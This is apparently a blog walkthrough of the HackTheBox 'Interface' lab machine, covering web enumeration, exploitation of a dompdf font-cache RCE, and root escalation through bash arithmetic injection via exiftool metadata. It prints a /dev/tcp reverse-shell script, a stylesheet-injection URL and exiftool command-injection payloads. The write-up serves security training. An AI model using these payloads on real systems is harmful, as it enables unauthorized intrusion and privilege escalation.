---
title: HTB - Interface
author: nirajkharel
date: 2023-05-14 14:10:00 +0800
categories: [HackTheBox]
tags: [HTB, HackTheBox]
render_with_liquid: false
---


HTB — Interface
================

A detailed walkthrough for solving Interface on HTB. The box contains vulnerability CVE-2022–28368 RCE on Dompdf and privilege escalation through arithmetic expression injection on bash through exiftool.

![](https://cdn-images-1.medium.com/max/2000/1*eTH__U21tGLnVBYb-ckVeQ.png)

## Enumeration

### NMAP

Let’s start with an NMAP Scanning to enumerate open ports and the services running on the IP.

    nmap -sC -sV -oA nmap/10.10.11.200 10.10.11.200 -vv

    22/tcp    open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 72:89:a0:95:7e:ce:ae:a8:59:6b:2d:2d:bc:90:b5:5a (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsUhYQQaT6D7Isd510Mjs3HcpUf64NWRgfkCDtCcPC3KjgNKdOByzhdgpqKftmogBoGPHDlfDboK5hTEm/6mqhbNQDhOiX1Y++AXwcgLAOpjfSExhKQSyKZVveZCl/JjB/th0YA12XJXECXl5GbNFtxDW6DnueLP5l0gWzFxJdtj7C57yai6MpHieKm564NOhsAqYqcxX8O54E9xUBW4u9n2vSM6ZnMutQiNSkfanyV0Pdo+yRWBY9TpfYHvt5A3qfcNbF3tMdQ6wddCPi98g+mEBdIbn1wQOvL0POpZ4DVg0asibwRAGo1NiUX3+dJDJbThkO7TeLyROvX/kostPH
    |   256 01:84:8c:66:d3:4e:c4:b1:61:1f:2d:4d:38:9c:42:c3 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrQxMOFdtvAa9AGgwirSYniXm7NpzZbgIKhzgCOM1qwqK8QFkN6tZuQsCsRSzZ59+3l+Ycx5lTn11fbqLFqoqM=
    |   256 cc:62:90:55:60:a6:58:62:9e:6b:80:10:5c:79:9b:55 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPtZ4bP4/4TJNGMNMmXWqt2dLijhttMoaeiJYJRJ4Kqy
    80/tcp    open     http    syn-ack     nginx 1.14.0 (Ubuntu)
    |_http-server-header: nginx/1.14.0 (Ubuntu)
    |_http-favicon: Unknown favicon MD5: 21B739D43FCB9BBB83D8541FE4FE88FA
    | http-methods: 
    |_  Supported Methods: GET HEAD
    |_http-title: Site Maintenance
    6112/tcp  filtered dtspc   no-response
    27715/tcp filtered unknown no-response

Add 10.10.11.200 as interface.htb on /etc/hosts and open the URL [http://interface.htb](http://interface.htb) in a web browser. We will come back into it later on.

    cat /etc/hosts
    
    # Host addresses
    127.0.0.1  localhost
    127.0.1.1  parrot
    10.10.11.200    interface.htb
    ::1        localhost ip6-localhost ip6-loopback
    ff02::1    ip6-allnodes
    ff02::2    ip6-allrouters
    # Others

### NMAP — All ports

    nmap -oA nmap/all-ports -p- 10.10.11.200 -vv

Noting interesting port was discovered other than the top 1000 ports.

### Directory Enumeration

**Feroxbuster**

    feroxbuster -u http://interface.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt 
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.9.5
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://interface.htb
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ All Status Codes!
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.9.5
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🔎  Extract Links         │ true
     🏁  HTTP methods          │ [GET]
     🔃  Recursion Depth       │ 4
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Management Menu™
    ──────────────────────────────────────────────────
    404      GET       12l      101w     2352c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
    308      GET        1l        1w       13c http://interface.htb/_next/static/ => http://interface.htb/_next/static
    308      GET        1l        1w       26c http://interface.htb/_next/static/chunks/pages/ => http://interface.htb/_next/static/chunks/pages
    308      GET        1l        1w       35c http://interface.htb/_next/static/Z79wh4kSTt439cxBUytQN/ => http://interface.htb/_next/static/Z79wh4kSTt439cxBUytQN
    308      GET        1l        1w       20c http://interface.htb/_next/static/chunks/ => http://interface.htb/_next/static/chunks
    308      GET        1l        1w        6c http://interface.htb/_next/ => http://interface.htb/_next
    308      GET        1l        1w       12c http://interface.htb/application/ => http://interface.htb/application
    200      GET        1l       39w     1591c http://interface.htb/_next/static/chunks/webpack-ee7e63bc15b31913.js
    200      GET        1l        2w       77c http://interface.htb/_next/static/Z79wh4kSTt439cxBUytQN/_ssgManifest.js
    200      GET        1l        1w      282c http://interface.htb/_next/static/Z79wh4kSTt439cxBUytQN/_buildManifest.js
    200      GET        1l        5w      279c http://interface.htb/_next/static/chunks/pages/_app-df511a3677d160f6.js
    200      GET        5l       46w    17312c http://interface.htb/favicon.ico
    200      GET        1l      316w    15444c http://interface.htb/_next/static/chunks/pages/index-c95e13dd48858e5b.js
    200      GET        1l     1559w    86841c http://interface.htb/_next/static/chunks/main-50de763069eba4b2.js
    200      GET        1l     1821w    91460c http://interface.htb/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js
    200      GET       33l     2908w   141045c http://interface.htb/_next/static/chunks/framework-8c5acb0054140387.js
    200      GET        1l      111w     6359c http://interface.htb/
    [####################] - 3m     30016/30016   0s      found:16      errors:1      
    [####################] - 3m     30000/30000   173/s   http://interface.htb/ 

**Dirsearch**

    python3 dirsearch.py -u http://interface.htb
    
      _|. _ _  _  _  _ _|_    v0.4.3
     (_||| _) (/_(_|| (_| )
    
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11710
    
    Output: /home/niraj/arsenal/web/dirsearch/reports/http_interface.htb/_23-05-05_22-37-09.txt
    
    Target: http://interface.htb/
    
    [22:37:09] Starting: 
    [22:38:03] 308 -   38B  - /\..\..\..\..\..\..\..\..\..\etc\passwd  ->  /../../../../../../../../../etc/passwd
    [22:38:08] 308 -    8B  - /a%5c.aspx  ->  /a/.aspx
    [22:39:49] 200 -   15KB - /favicon.ico
    
    Task Completed

### Subdomain Enumeration

**FFuF**

    ffuf -u http://interface.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.interface.htb" -fs 6359
    
            /'___\  /'___\           /'___\       
           /\ \__/ /\ \__/  __  __  /\ \__/       
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
             \ \_\   \ \_\  \ \____/  \ \_\       
              \/_/    \/_/   \/___/    \/_/       
    
           v1.5.0-dev
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://interface.htb
     :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
     :: Header           : Host: FUZZ.interface.htb
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
     :: Filter           : Response size: 6359
    ________________________________________________
    
    :: Progress: [4989/4989] :: Job [1/1] :: 145 req/sec :: Duration: [0:00:39] :: Errors: 0 ::

### Path Enumeration from JS

**GoSpider**

    gospider -s http://interface.htb | grep url
    [url] - [code-200] - http://interface.htb
    [url] - [code-200] - http://interface.htb/_next/static/chunks/webpack-ee7e63bc15b31913.js
    [url] - [code-200] - http://interface.htb/_next/static/chunks/pages/_app-df511a3677d160f6.js
    [url] - [code-200] - http://interface.htb/_next/static/chunks/pages/index-c95e13dd48858e5b.js
    [url] - [code-200] - http://interface.htb/_next/static/Z79wh4kSTt439cxBUytQN/_ssgManifest.js
    [url] - [code-200] - http://interface.htb/_next/static/Z79wh4kSTt439cxBUytQN/_buildManifest.js
    [url] - [code-200] - http://interface.htb/_next/static/chunks/main-50de763069eba4b2.js
    [url] - [code-200] - http://interface.htb/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js
    [url] - [code-200] - http://interface.htb/_next/static/chunks/framework-8c5acb0054140387.js
    [url] - [code-200] - http://interface.htb/
    [url] - [code-400] - http://interface.htb/_next/image

### Explore the Application

![](https://cdn-images-1.medium.com/max/3032/1*yEMgorFVi0_4jRTTq-th5w.png)

The application does not contains any information or pages other that shown above.

I tried viewing the technologies implemented on the application and found it is using NextJS and Node. Searched some vulnerabilities related to it but no luck on that as well.

I began analyzing the JavaScript file discovered by GoSpider in a hope to find any hard coded secrets, credentials, directory or any other hints.

    wget http://interface.htb/_next/static/chunks/main-50de763069eba4b2.js

Open the JS file with Sublime and beautify the code so that we have have the better visualization of it.

![](https://cdn-images-1.medium.com/max/2000/1*TIkIOLAoKt1mrVEWdhXWJA.png)

We can see the /api route on the source code, therefore let’s try to enumerate the additional endpoint under /api.

    python3 dirsearch.py -u http://interface.htb/api/                                                           
                                                                                                                                            
      _|. _ _  _  _  _ _|_    v0.4.3                                                                                                        
     (_||| _) (/_(_|| (_| )                                                                                                                 
                                                                                                                                            
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11710                                            
                                                                                                                                            
    Output: /home/niraj/arsenal/web/dirsearch/reports/http_interface.htb/_api__23-05-05_23-20-18.txt                                        
                                                                                                                                            
    Target: http://interface.htb/                                                                                                           
                                                                                                                                            
    [23:20:18] Starting: api/                                                                                                               
    [23:20:47] 308 -   42B  - /api/\..\..\..\..\..\..\..\..\..\etc\passwd  ->  /api/../../../../../../../../../etc/passwd                   
    [23:20:50] 308 -   12B  - /api/a%5c.aspx  ->  /api/a/.aspx 

Change the request method to POST since some api endpoints might be accepting POST requests as well.

    python3 dirsearch.py -u http://interface.htb/api/ --http-method=POST
    
      _|. _ _  _  _  _ _|_    v0.4.3
     (_||| _) (/_(_|| (_| )
    
    Extensions: php, aspx, jsp, html, js | HTTP method: POST | Threads: 25 | Wordlist size: 11710
    
    Output: /home/niraj/arsenal/web/dirsearch/reports/http_interface.htb/_api__23-05-06_00-01-18.txt
    
    Target: http://interface.htb/
    
    [00:01:18] Starting: api/
    [00:01:46] 308 -   42B  - /api/\..\..\..\..\..\..\..\..\..\etc\passwd  ->  /api/../../../../../../../../../etc/passwd
    [00:01:48] 308 -   12B  - /api/a%5c.aspx  ->  /api/a/.aspx

Viewing the source code again, we can find the additional path called /_next/image.

![](https://cdn-images-1.medium.com/max/2000/1*Azkqz799w_xcyB4vh1fq4w.png)

Opening the path on the browser, it responds with a message that url parameter is required.

![](https://cdn-images-1.medium.com/max/2000/1*RQPjYtCvPsufdeCtG3gQBg.png)

Let’s see if we could supply the same domain on the URL parameter. It responds with url parameter is not allowed message. We should check possible SSRF attacks here.

![](https://cdn-images-1.medium.com/max/2000/1*jh0yXCEBigzGYVus2RLWLA.png)

Finding the protocols supported by the parameter URL using burp’s intruder.

![](https://cdn-images-1.medium.com/max/2000/1*7T0iffFIrSz7xu8vGxsm7A.png)

I tried bunch of services to see if the parameter supports any of them but it seems like that it only process for HTTP and HTTPS.

Also tried bunch of SSRF bypass payloads, file inclusions, path traversal payloads but there was no any useful outcome.

I decided to navigate through the application again and start intercepting every requests that it performs while loading the web page.

![](https://cdn-images-1.medium.com/max/2000/1*45MAmv6jD2ChMkrMilJzyg.png)

There was no any interesting endpoints but if we look at the response header Content-Security-Policy, we can find a new subdomain associated with the application which is [http://prd.m.rendering-api.interface.htb](http://prd.m.rendering-api.interface.htb). I could have never identify this subdomain with subdomain brute force lol.

I was missing this from the start ;). I could have get this by just using the **curl -I** command.

    curl -I http://interface.htb
    HTTP/1.1 200 OK
    Server: nginx/1.14.0 (Ubuntu)
    Date: Fri, 05 May 2023 18:44:08 GMT
    Content-Type: text/html; charset=utf-8
    Content-Length: 6359
    Connection: keep-alive
    Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src 'self' http://prd.m.rendering-api.interface.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;
    X-Powered-By: Next.js
    ETag: "i8ubiadkff4wf"
    Vary: Accept-Encoding

Add [prd.m.rendering-api.interface.htb](http://prd.m.rendering-api.interface.htb) on /etc/hosts and open URL [http://prd.m.rendering-api.interface.htb](http://prd.m.rendering-api.interface.htb) on the browser.

    cat /etc/hosts
    # Host addresses
    127.0.0.1  localhost
    127.0.1.1  parrot
    10.10.11.200    interface.htb prd.m.rendering-api.interface.htb
    ::1        localhost ip6-localhost ip6-loopback
    ff02::1    ip6-allnodes
    ff02::2    ip6-allrouters
    # Others

Open the subdomain on a browser.

![](https://cdn-images-1.medium.com/max/2000/1*Y5tbqyG0RRycXtolebowhg.png)

The application responds with message File Not Found.

### Subdomain Directory Enumeration

Let’s enumerate if this subdomain contains any directories or files. I used two tools Gobuster and Feroxbuster for this with different wordlist so that I would not miss any directories. However I did not get **200 OK** for any directories, I found that the application is responding with **403 Forbidden** for **/vendor** which means that the the server understands the request but can’t provide additional access

**Gobuster**

    gobuster dir -u http://prd.m.rendering-api.interface.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Cont
    ent/directory-list-2.3-medium.txt
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://prd.m.rendering-api.interface.htb
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Timeout:                 10s
    ===============================================================
    2023/05/06 00:36:23 Starting gobuster in directory enumeration mode
    ===============================================================
    /vendor               (Status: 403) [Size: 15]

**Feroxbuster**

    feroxbuster -u http://prd.m.rendering-api.interface.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.9.5
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://prd.m.rendering-api.interface.htb
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ All Status Codes!
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.9.5
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🔎  Extract Links         │ true
     🏁  HTTP methods          │ [GET]
     🔃  Recursion Depth       │ 4
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Management Menu™
    ──────────────────────────────────────────────────
    404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
    404      GET        1l        3w       16c http://prd.m.rendering-api.interface.htb/
    404      GET        1l        3w       50c http://prd.m.rendering-api.interface.htb/api
    403      GET        1l        2w       15c http://prd.m.rendering-api.interface.htb/vendor
    [####################] - 3m     30000/30000   0s      found:3       errors:0      
    [####################] - 3m     30000/30000   169/s   http://prd.m.rendering-api.interface.htb/  

![](https://cdn-images-1.medium.com/max/2000/1*aSQJi1UzZwYcR4ntznOEPw.png)

Opening the directory **/vendor**, we can find the expected response which is Access denied. I was curious if this endpoint would support other HTTP verbs like POST as well but the response was same.

    curl http://prd.m.rendering-api.interface.htb/vendor
    Access denied.
    
    curl -X POST http://prd.m.rendering-api.interface.htb/vendor      
    Access denied.

Let’s enumerate the directory **/vendor** further with Feroxbuster, I could have done that recursively.

    feroxbuster -u http://prd.m.rendering-api.interface.htb/vendor/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.9.5
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://prd.m.rendering-api.interface.htb/vendor/
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ All Status Codes!
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.9.5
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🔎  Extract Links         │ true
     🏁  HTTP methods          │ [GET]
     🔃  Recursion Depth       │ 4
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Management Menu™
    ──────────────────────────────────────────────────
    404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
    404      GET        1l        3w       16c http://prd.m.rendering-api.interface.htb/vendor/
    403      GET        1l        2w       15c http://prd.m.rendering-api.interface.htb/vendor/dompdf
    403      GET        1l        2w       15c http://prd.m.rendering-api.interface.htb/vendor/composer
    [####################] - 3m     30000/30000   0s      found:3       errors:0      
    [####################] - 3m     30000/30000   177/s   http://prd.m.rendering-api.interface.htb/vendor/ 

We can see that there are other paths under **/vendor** as **/dompdf** and **/composer** which has 403 as status on response. Let’s enumerate this endpoints further.

![](https://cdn-images-1.medium.com/max/2000/1*h8Le22ms92zngJb5araN9w.png)

![](https://cdn-images-1.medium.com/max/2000/1*tSkEnV5VCN9EVY3krsxbkw.png)

Decided to give a try with Dirsearch with recursive mode enabled, I found some PHP endpoints.

    python3 dirsearch.py -u http://prd.m.rendering-api.interface.htb -r
    
    [01:01:01] 403 -   15B  - /composer.json
    [01:01:01] 403 -   15B  - /composer.lock
    [01:02:15] 200 -    0B  - /vendor/autoload.php
    [01:02:15] 200 -    0B  - /vendor/composer/autoload_classmap.php
    [01:02:15] 200 -    0B  - /vendor/composer/autoload_namespaces.php
    [01:02:15] 200 -    0B  - /vendor/composer/autoload_psr4.php
    [01:02:15] 200 -    0B  - /vendor/composer/autoload_real.php
    [01:02:15] 200 -    0B  - /vendor/composer/ClassLoader.php
    [01:02:15] 403 -   15B  - /vendor/composer/LICENSE
    [01:02:15] 200 -    0B  - /vendor/composer/autoload_static.php
    [01:02:16] 403 -   15B  - /vendor/composer/installed.json

Using Feroxbuster Scan Management Menu, I have added sub folders on the scan as well and viewed if we could discover any.

![](https://cdn-images-1.medium.com/max/2000/1*t-0qz4UQBarIVFzrHpCadw.png)

We found that it contains another sub directory called **/dompdf** inside **/dompdf**.

Let’s search what this **dompdf** actually mean.

![](https://cdn-images-1.medium.com/max/2122/1*kib2gJkaqZVRYtDDh9Kiog.png)

It is a HTML to PDF converter for PHP which means the application is actually using PHP as well for backend.

Let’s search if this contains any vulnerability.

![](https://cdn-images-1.medium.com/max/2850/1*vQnKMqaqhluSx9mLh1cQWQ.png)

And we got some hope. The **dompdf** contains Remote Code Execution vulnerability. Let’s understand this vulnerability at first.

So basically, **dompdf** versions <1.2.1 are vulnerable to Remote Code Execution (RCE) by injecting CSS into the data. The file can be tricked into storing a malicious font with a .php file extension in its font cache, which can later be executed by accessing it from the web.

I am not going to explain why this vulnerability existed on the on dompdf since there are plenty of resources our there. If you are interested to deep dive into it further, you can visit below resources. 

[Exploiting RCE Vulnerability in Dompdf](https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf)   

[From XSS to RCE (dompdf 0day) | Positive Security](https://positive.security/blog/dompdf-rce)  

[Dompdf RCE | Exploit Notes](https://exploit-notes.hdks.org/exploit/web/dompdf-rce/)

Download the exploit [https://github.com/positive-security/dompdf-rce](https://github.com/positive-security/dompdf-rce)

    git clone https://github.com/positive-security/dompdf-rce
    Cloning into 'dompdf-rce'...
    remote: Enumerating objects: 343, done.
    remote: Counting objects: 100% (343/343), done.
    remote: Compressing objects: 100% (271/271), done.
    remote: Total 343 (delta 67), reused 329 (delta 62), pack-reused 0
    Receiving objects: 100% (343/343), 3.99 MiB | 5.26 MiB/s, done.
    Resolving deltas: 100% (67/67), done.
    

Navigate into the downloaded directory, we can see two files **exploit.css** and **exploit_font.php** inside exploit sub-directory.

![](https://cdn-images-1.medium.com/max/2000/1*oTpw7Xcwb_rbQLtMDwn0SA.png)

Viewing the content of exploit_font.php file, we can see the `<?php phpinfo();?>` command at the end of the file. The other content shows that the file is not actually a PHP file but some kind of file for fonts, the above command is inserted at the end of the file and the file has been renamed to .php so that the PHP code would execute.

![](https://cdn-images-1.medium.com/max/2000/1*4LKBTyyNPibb4fbTEHKvKA.png)

As discussed, the file is a font file.

![](https://cdn-images-1.medium.com/max/2000/1*Tdsy-_ADnwAFCMyPHabomA.png)

Viewing the content of exploit.css file, we can see that the font file is loaded from the URL [http://localhost:9001/exploit_font.php](http://localhost:9001/exploit_font.php).

![](https://cdn-images-1.medium.com/max/2000/1*W_LQS-IK2KVWbLk7rA4J9Q.png)

Let’s make some changes into the CSS file and insert our IP.

![](https://cdn-images-1.medium.com/max/2000/1*_LbPBjO9NV0vSCEBAG3PGQ.png)

In order to perform the exploit, we need to craft our URL as **http://prd.m.rendering-api.interface.htb/index.php?pdf&title=\<link rel=stylesheet href=’http://10.10.14.45:9001/exploit.css’>**

Setup the server in the directory where the CSS and PHP file is located and listen to the port 9001.

![](https://cdn-images-1.medium.com/max/2000/1*nHu6-uzMiHisBsAvoElwTg.png)

Open the above URL on the browser, we should get the hit. But we didn’t get any hit to our server. Means that we are doing something wrong probably.

![](https://cdn-images-1.medium.com/max/2642/1*yOMvAhXUAu_vLpY6BvJymg.png)

Spent some time figuring out how to exploit this but every exploit techniques available on the internet was using the same approach above. But does that **index.php** file actually exist on the system? If not, there is no point of executing our payload.

![](https://cdn-images-1.medium.com/max/2000/1*68Maw1NCDWQ0pPqsLfMVuw.png)

Since the **index.php** file which was used on the exploit provided does not exist, we need to find another endpoint which does the work.

As we navigate to the result of Feroxbuster above we have discovered two directories **/api** and **/vendor**. We ignored the **/api** because it was returning 404 Not Found status. Since we have already gone through the sub-directories on **/vendor**, the only remaining is **/api**.

![](https://cdn-images-1.medium.com/max/2000/1*RDNuRuovm31b9CMCTUVLZA.png)

Tried different tools and wordlists but no any luck here as well. But I was in hope that this /api/ contains something that I am missing.

![](https://cdn-images-1.medium.com/max/2000/1*tF_8NOGoFz19Mftcu7zwXA.png)

As said, I decided to view the response headers on the **/api/** and another random directory **/test/** which actually does not exists on the system. Despite of both the directories were returning 404 Not Found, there was one difference which is **Content-Type**. The server is indicating that the response body is in JSON format, so we should interpret it as such. This means there is something inside the **/api/** directory which accepts JSON request. The endpoint accepts only JSON requests means that we need to use the POST method here.

I tried to fuzz this endpoint using POST request method as well. The dirsearch tool does not discovered any output. Let’s see if we could find anything with Feroxbuster. May be I should start using Feroxbuster as a primary directory busting tool.

    feroxbuster -u http://prd.m.rendering-api.interface.htb/api/ -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -m POST 

![](https://cdn-images-1.medium.com/max/2000/1*XuAHEUf1r8DuLG4Uj8R0iA.png)

I found a new endpoint **/api/html2pdf** which was returning method 422 which means the server can’t process your request, although it understands it. This can be since the server is accepting only JSON requests. But we don’t know what are the body parameters. We can just Burp Suite to fuzz the parameters as well.

Open the URL [http://prd.m.rendering-api.interface.htb/api/html2pdf/](http://prd.m.rendering-api.interface.htb/api/html2pdf/) on a browser, intercept the request, change the method to POST and forward the request.

![](https://cdn-images-1.medium.com/max/2000/1*NN5SnzNfCeMWDswbVG8mRA.png)

We can see the response indicating it needs some parameters.

![](https://cdn-images-1.medium.com/max/2000/1*w0yycyyfrH4x8agHwWnljA.png)

Crafted the dummy JSON parameters and send it to Intruder to fuzz it.

![](https://cdn-images-1.medium.com/max/2000/1*HkQqzwXnyNTCPvTvPrJSFw.png)

Found the body parameter which is required in this endpoint. It seems like this request takes HTML entities as input and will convert it into PDF which is exactly the work of dompdf. Let’s insert our previous payload in this parameter and see if we get any hits on our server.

![](https://cdn-images-1.medium.com/max/2000/1*PeqyaOjOFKZlo1Hsv85hLg.png)

And we got the hit.

Craft the reverse shell payload on file exploit_font.php

![](https://cdn-images-1.medium.com/max/2000/1*a1Pfd98XAwR22FP4kUAXkw.png)

Host the file.

![](https://cdn-images-1.medium.com/max/2000/1*zAfx-C1OrzlAYFox8mP0Pw.png)

Now lets confirm the vulnerability. It looks like our PHP file has been uploaded into the server but we need to find the path where PHP file is uploaded. As described on the exploit above, when dompdf is used, the PHP file gets uploaded into **/dompdf/dompdf/lib/fonts/** directory starting with a name **\<font-family>\_normal\_md5sum** of **[http://10.10.14.45:9001/exploit_font.php.](http://10.10.14.45:9001/exploit_font.php.)**

Calculate the md5sum of [http://10.10.14.45:9001.](http://10.10.14.45:9001.)

    echo -n http://10.10.14.45:9001/exploit_font.php | md5sum
    cfd281dfa4a422b4fe0714b100d5a79b

Then the destination of our exploit would be

[http://prd.m.rendering-api.interface.htb/dompdf/dompdf/lib/fonts/exploitfont_normal_cfd281dfa4a422b4fe0714b100d5a79b.php](http://prd.m.rendering-api.interface.htb//dompdf/dompdf/lib/fonts/exploit_font_normal_cfd281dfa4a422b4fe0714b100d5a79b.php)

Open the above URL on the browser. Before that, setup a netcat listener.

![](https://cdn-images-1.medium.com/max/2000/1*AhAQjBX58E63aaV38T7sEA.png)

The reverse shell is received as **www-data** user.

![](https://cdn-images-1.medium.com/max/2000/1*RwdhQbe_ZLyvO94PgIGDsw.png)

Navigate to /home directory to see if we got any user. There is a user dev which contains user.txt file. Cat the file to view the content.

![](https://cdn-images-1.medium.com/max/2000/1*cGAQHrKM-7eTWk_4mND50g.png)

And we got our user.txt file.

### Privilege Escalation

Download pspy32s into the box and run it to view all the running process and command run by them.

![](https://cdn-images-1.medium.com/max/2000/1*AlX1evl0N3M4gosYW-6Yeg.png)

Print both commands and file system events and scan procfs every 1000 ms.

    chmod +x pspy32s 
    ./pspy32s -pf -i 1000

But when downloading the file and executing it on **/tmp** directory the file was deleted on few seconds itself. Might be some type of cronjob is running to delete the file on **/tmp** directory. We will look into it afterwards. Let’s download the file on the home directory and execute it.

![](https://cdn-images-1.medium.com/max/2000/1*LxcgUALMtkLUwSPZIeuMAw.png)

Use the same above execution commands to run the tool.

![](https://cdn-images-1.medium.com/max/2000/1*FDHrO6xXQPpCCHUYF4JwjA.png)

From the above image, it shows that a cronjob has been set up to execute the script **/usr/local/sbin/cleancache.sh** with root privileges. Additionally, the pspy output indicates that this script has been running multiple times at regular intervals, suggesting that it is being executed according to a schedule.

Let’s view the content of **/usr/local/sbin/cleancache.sh** file.

    cat /usr/local/sbin/cleancache.sh
    #! /bin/bash
    cache_directory="/tmp"
    for cfile in "$cache_directory"/*; do
    
        if [[ -f "$cfile" ]]; then
    
            meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)
    
            if [[ "$meta_producer" -eq "dompdf" ]]; then
                echo "Removing $cfile"
                rm "$cfile"
            fi
    
        fi
    
    done

The script loops through every file in **/tmp** directory and use **exiftool** to verify if the file has dompdf as **Producer** metadata and if it has value dompdf as a producer metadata, it deletes the file.

Since the script is run by root, we need to inject a simple image with some command on Producer metadata so that it would execute while running the script.

![](https://cdn-images-1.medium.com/max/2000/1*HFk4H2U-D3jktzu-O0ZxTQ.png)

Create a reverse.sh file which executes the reverse shell payload into our system.

    #!/bin/bash
    /bin/bash -i >& /dev/tcp/10.10.14.57/1339 0>&1

![](https://cdn-images-1.medium.com/max/2000/1*A4Ml2ozeIUla5hD_2pGErA.png)

Transfer that bash file to **/var/www/** folder in the box. **/var/www/** folder is set to be default home directory in the box.

![](https://cdn-images-1.medium.com/max/2000/1*xLrU4eIlg2thlYQdRXvm4g.png)

Inject command to execute **/var/www/reverse.sh** whenever the output of the exiftool is compared.

    exiftool -Producer='$(/var/www/reverse.sh>&2)' image.jpg

After injecting the command in Producer metadata, transfer that file into /tmp directory of the box. We should get the reverse shell here, since when the **/usr/local/sbin/cleancache.sh** script runs, it will take out the Producer metadata which we injected, store in a variable and executes it during the comparison with dompdf.

![](https://cdn-images-1.medium.com/max/2000/1*J4IcnLzQGpHf4f1RucMt7Q.png)

But waiting for the long time, we did not get any reverse connection here. Let’s execute the script **/usr/local/sbin/cleancache.sh** manually and see if we get any hint or error.

![](https://cdn-images-1.medium.com/max/2000/1*xbQmWvRsDt5neYYSfe42xw.png)

We got some syntax error during comparison. After enumerating some resources regarding the syntax during bash comparison and possible command injection on it, I found a very useful resources.
[Bash's white collar eval: [[ $var -eq 42 ]] runs arbitrary code too](https://www.vidarholen.net/contents/blog/?p=716)

This resource explains how we can inject the command in comparisons.

![](https://cdn-images-1.medium.com/max/2034/1*ndi5A8YTJtUW-PFe0sLYJw.png)

Crafting our payload again.

    exiftool -Producer='a[$(/var/www/reverse.sh>&2)]+42' image.jpg

Transfer the image.jpg file to the **/tmp** directory again and listen to port 9002 since our script reverse.sh sends reverse connection on port 9002.

![](https://cdn-images-1.medium.com/max/2000/1*BkeVF43Cv3_A257RxQ7l3w.png)

We got our root shell. You need to wait some seconds.

![](https://cdn-images-1.medium.com/max/2000/1*Qlz7slde6HaPC7c-67sXew.png)

Here you go! Happy Hacking !!!
